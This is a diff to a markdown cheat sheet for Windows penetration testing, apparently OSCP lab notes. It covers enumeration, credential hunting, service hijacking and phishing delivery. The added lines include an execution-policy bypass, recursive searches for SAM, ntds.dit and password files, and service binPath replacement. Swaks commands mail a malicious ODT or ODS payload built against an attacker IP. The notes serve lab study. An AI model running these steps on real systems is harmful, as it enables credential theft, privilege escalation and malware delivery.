@@ -13,7 +13,7 @@ There are several key pieces of information we should always obtain:
 - Running processes
 
 ```bash
-> powershell
+> powershell -ep bypass
 > whoami
 > whoami /all
 > net user
@@ -34,6 +34,9 @@ There are several key pieces of information we should always obtain:
 # Check all installed applications. We can query two registry keys to list both 32-bit and 64-bit applications in the Windows Registry with the Get-ItemProperty Cmdlet. We pipe the output to select with the argument displayname to only display the application's names. We begin with the 32-bit applications and then display the 64-bit applications.
 > netsh firewall show state
 > netsh firewall show config
+# Does the computer have an unexpected public ip, internal ip.. look into it
+> arp -A # -a
+> accesschk.exe -uwcqv "Authenticated Users" *
 # How well patched is the system?
 > wmic qfe get Caption,Description,HotFixID,InstalledOn
 > Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # You should check whether the applications on the system have public exploits
@@ -53,7 +56,7 @@ There are several key pieces of information we should always obtain:
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,*.git,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*cred*,*.ini,*oscp*,*ms01*,*lance*,*pass*,*ms02*,*dc01*,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
+> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.git,*.rdp,*.config,*cups*,*print*,*secret*,*cred*,*.ini,*oscp*,*ms01*,*pass*,*ms02*,*dc01*,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue | Where-Object { -not ($_.FullName -like "C:\Windows\servicing\LCU\*") -and -not ($_.FullName -like "C:\Windows\Microsoft.NET\Framework\*") -and -not ($_.FullName -like "C:\Windows\WinSxS\amd*") -and -not ($_.FullName -like "C:\Windows\WinSxS\x*")}
 > Get-ChildItem -Path C:\ -Include SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
@@ -818,6 +821,7 @@ If you see any instance where a script or a cronjob does not specify the full pa
 
 ### Service DLL Hijacking
 
+Identifying.
 
 ```bash
 # Check what binaries are running, as before
@@ -854,6 +858,12 @@ Since you need administritave privileges to run Process Monitor, it's standard p
 
 ```bash
 sc create SchedulerService binPath= "C:\Windows\Tasks\scheduler.exe" DisplayName= "Scheduler Service" start= auto
+```
+
+If you have permissions over the service, you can modify the service's executable path:
+
+```bash
+sc config servicename binPath= "C:\Path\To\New\Service.exe"
 ```
 
 Note that you can create a reverse shell dll:
@@ -966,6 +976,14 @@ copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
 Start-Service GammaService
 net user 
 net localgroup administrators # Verify the executable worked
+```
+
+If you can't seem exploit an unquoted service path, try renaming the current service to something else, that way you're not deleting it, which can fail if the service is running or for permissions. Then, you upload your own binary and move it to the name of the original binary.
+
+If you have permissions over the service, you can modify the service's executable path:
+
+```bash
+sc config servicename binPath= "C:\Path\To\New\Service.exe"
 ```
 
 Don't forget to put everything back where it was. :)
@@ -1780,3 +1798,4 @@ python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-s
 python /opt/mmg-ods.py windows 192.168.45.178 80
 sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.218.140 --body body.txt --header "Subject: Staging Script"
 ```
+sudo swaks -t neil@bratarina --from _smtpd@COFFEECORP --attach @bad.odt --server $ip --body body.txt --header "Subject: Staging Script"
